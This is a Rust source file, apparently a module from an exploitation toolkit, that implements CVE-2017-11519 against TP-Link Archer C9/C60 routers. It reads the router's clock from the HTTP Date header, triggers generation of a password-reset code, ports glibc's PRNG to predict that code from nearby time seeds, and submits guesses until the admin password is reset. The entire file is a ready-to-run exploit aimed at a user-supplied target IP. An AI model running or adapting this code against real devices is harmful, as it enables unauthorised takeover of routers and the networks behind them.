use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use chrono::DateTime;
use serde_json::Value; // Added import for Value
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link Archer C9/C60 Password Reset (CVE-2017-11519)
/// 
/// Exploits predictable PRNG for password reset code.
/// - Gets server time from Date header.
/// - Triggers reset code generation.
/// - Brute-forces seeds (time .. time+5) to guess reset code.
/// - Resets admin password.

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║  TP-Link Archer C9/C60 Password Reset (CVE-2017-11519)    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let port_str = prompt_default("Port", "80").await?;
    let port: u16 = port_str.parse().context("Invalid port")?;
    
    let base_url = format!("http://{}:{}", target_ip, port);

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()?;

    // 1. Get server time
    println!("{} Getting server time...", "[*]".blue());
    let res = client.get(&base_url).send().await?;
    let date_header = res.headers().get("Date").context("Date header not found")?.to_str()?;
    
    // Parse Date: "Fri, 21 Jul 2017 18:30:00 GMT" (RFC 1123)
    let dt = DateTime::parse_from_rfc2822(date_header).context("Failed to parse Date header")?;
    let server_ts = dt.timestamp();
    println!("{} Server Time: {} (TS: {})", "[+]".green(), date_header, server_ts);

    // 2. Generate reset code
    println!("{} Triggering reset code generation...", "[*]".blue());
    let gen_url = format!("{}/cgi-bin/luci/;stok=/login?form=vercode", base_url);
    let gen_res = client.post(&gen_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body("operation=read")
        .send().await?;
        
    if !gen_res.status().is_success() {
        println!("{} Failed to trigger reset code.", "[-]".red());
        return Ok(());
    }

    // 3. Brute force seeds
    println!("{} Guessing reset code (Time window: +5s)...", "[*]".blue());
    let start_seed = server_ts as i64;
    
    for seed in start_seed..start_seed + 6 {
         let seed_i32 = seed as i32; // Reset seed uses int (likely 32-bit on device, Python used int)
         // Python PoC uses 'int' which is arbitrary precision but device is likely 32bit. 
         // The glitch_prng implementation handles overflow.
         
         // In PoC: get_random(seed, 100000, 999999)
         let code = get_random(seed_i32, 100000, 999999);
         println!("{} Trying code {} (Seed: {})", "[*]".blue(), code, seed);
         
         if try_reset(&client, &gen_url, code).await? {
             println!("{} Success! Admin password reset verified.", "[+]".green().bold());
             return Ok(());
         }
    }
    
    println!("{} Failed to guess reset code.", "[-]".red());

    Ok(())
}

async fn try_reset(client: &Client, url: &str, code: i32) -> Result<bool> {
    // data={"operation": "write", "vercode": code}
    let body = format!("operation=write&vercode={}", code);
    
    let res = client.post(url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send().await?;
        
    if res.status().is_success() {
        let json: Value = res.json().await?;
        if let Some(success) = json.get("success") {
            if let Some(b) = success.as_bool() {
                return Ok(b);
            }
        }
    }
    Ok(false)
}


// PRNG Port
// Python glibc_prng equivalent

struct GlibcPrng {
    r: Vec<i32>,
    ptr: usize,
}

impl GlibcPrng { // Added methods inside impl block
    fn new(seed: i32) -> Self {
        let mut r = vec![0i32; 344];
        r[0] = seed;

        for i in 1..31 {
            let val = (16807i64 * r[i - 1] as i64) % 0x7fffffff;
            let mut val_i32 = val as i32;
            if val_i32 < 0 {
                val_i32 += 0x7fffffff;
            }
            r[i] = val_i32;
        }
        
        for i in 31..34 {
            r[i] = r[i - 31];
        }
        for i in 34..344 {
            let val = r[i - 31].wrapping_add(r[i - 3]);
             r[i] = val; // int32 truncation is implicit in i32
        }
        
        Self { r, ptr: 344 - 1 }
    }

    fn next(&mut self) -> i32 {
        self.ptr += 1;
        // Logic: r.append(int32(r[i - 31] + r[i - 3]))
        // yield int32((r[i] & 0xffffffff) >> 1)
        
        // We simulate infinite append by treating it as a rolling buffer or just computing next on demand.
        // Actually the PoC appends to lists. We can just keep extending or compute indices relative to end.
        // Since we only need ONE random number usually (per seed), we don't need optimized rolling.
        // But get_random calls next() once.
        
        // Replicating PoC:
        // while True: i+=1; r.append(...); yield ...
        
        let i = self.ptr;
        let new_val = self.r[i - 31].wrapping_add(self.r[i - 3]);
        self.r.push(new_val);
        
        let res = (self.r[i] as u32 >> 1) as i32;
        res
    }
}


fn get_random(seed: i32, t: i32, u: i32) -> i32 {
    let mut prng = GlibcPrng::new(seed);
    let r_val = prng.next();
    
    const RAND_MAX: f64 = 2147483647.0; // 0x7fffffff
    let r = (r_val as f64) % RAND_MAX / RAND_MAX;
    
    let res = (r * (u - t + 1) as f64).floor() as i32 + t;
    res
}
